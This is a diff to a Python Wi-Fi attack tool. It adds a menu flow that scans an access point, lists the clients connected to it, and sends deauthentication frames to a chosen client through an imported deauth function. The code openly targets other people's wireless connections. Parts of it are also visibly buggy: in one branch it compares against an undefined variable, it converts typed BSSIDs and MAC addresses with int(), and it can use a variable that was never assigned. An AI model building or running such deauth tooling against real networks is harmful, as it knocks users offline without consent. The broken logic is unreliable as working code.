@@ -15,7 +15,6 @@
 from scanner import Scanner
 import sys
 from deauth import deauth
-from get_clients_on_ap import get_clients_on_ap
 import datetime
 from getpass import getuser
 
@@ -102,7 +101,7 @@ def show_aps():
         return False
 
 
-def show_clients():
+def show_clients() -> bool:
     # Check if we have scanned the network. If so, we can prompt user for AP to attack from scanner.wifis
     if scanner.wifis:
         print("Choose AP to attack from list:")
@@ -113,6 +112,41 @@ def show_clients():
         if AP_to_attack == len(scanner.wifis) + 1:
             AP_to_attack = int(input("Input AP BSSID for client scan: "))
         target_ap = scanner.wifis[AP_to_attack]
+    else:
+        AP_to_attack_str = input("Input AP BSSID for client scan: ")
+        print("Scanning network for selected AP...")
+        scanner.get_ap(timeout=TIMEOUT, specific_ap=AP_to_attack_str)
+        # in scanner.wifis find the AP with the same BSSID as the one we scanned for
+        for wifi in scanner.wifis:
+            if wifi.BSSID == AP_to_attack:
+                target_ap = wifi
+                break
+        # check if we found the AP
+        if not target_ap:
+            print("Could not find AP in scanned APs. Try scanning network first.")
+            return False
+
+    print(f"Extracting client list for AP: {target_ap.SSID}")
+    scanner.set_channel(target_ap.channel)
+    client_list = scanner.get_clients_on_ap(TIMEOUT, INTERFACE, target_ap.BSSID)
+    # Print new clients obtained and all the clients seen on the wifi
+    print(f"New clients: {client_list}")
+    print(f"All clients: {target_ap.clients}")
+    return True
+
+
+def send_deauth():
+    # Check if we have scanned the network. If so, we can prompt user for AP to attack from scanner.wifis
+    if scanner.wifis:
+        print("Choose AP to attack from list:")
+        for i, wifi in enumerate(scanner.wifis):
+            print(f"{i}. {wifi.SSID} - {wifi.BSSID}")
+        print(f"{len(scanner.wifis)+1}. User defined AP")
+        AP_to_attack = int(input("Input index of AP to attack: "))
+        if AP_to_attack == len(scanner.wifis) + 1:
+            AP_to_attack = int(input("Input AP BSSID for client scan: "))
+        target_ap = scanner.wifis[AP_to_attack]
+    # If we haven't scanned the network, prompt user for AP to attack
     else:
         AP_to_attack = input("Input AP BSSID for client scan: ")
         print("Scanning network for selected AP...")
@@ -127,16 +161,21 @@ def show_clients():
             print("Could not find AP in scanned APs. Try scanning network first.")
             return False
 
-    print(f"Extracting client list for AP: {target_ap.SSID}")
-    scanner.set_channel(target_ap.channel)
-    client_list = get_clients_on_ap(TIMEOUT, INTERFACE, target_ap.BSSID)
-    print(client_list)
+    # Check if we have clients on the AP. If so, prompt user for client to deauth
+    if target_ap.clients:
+        print("Choose client to deauth from list:")
+        for i, client in enumerate(target_ap.clients):
+            print(f"{i}. {client}")
+        print(f"{len(target_ap.clients)+1}. User defined client")
+        client_to_deauth = int(input("Input index of client to deauth: "))
+        if client_to_deauth == len(target_ap.clients) + 1:
+            client_to_deauth = int(input("Input client MAC for deauth: "))
+        target_client = target_ap.clients[client_to_deauth]
+    # If we don't have clients on the AP, prompt user for client to deauth
+    else:
+        target_client = input("Input client MAC for deauth: ")
 
-
-def send_deauth():
-    target_ap = input("Input AP BSSID for deauth: ")
-    target_client = input("Input client MAC for deauth: ")
-    deauth(INTERFACE, target_ap, target_client)
+    deauth(INTERFACE, target_ap.BSSID, target_client)
 
 
 def options():
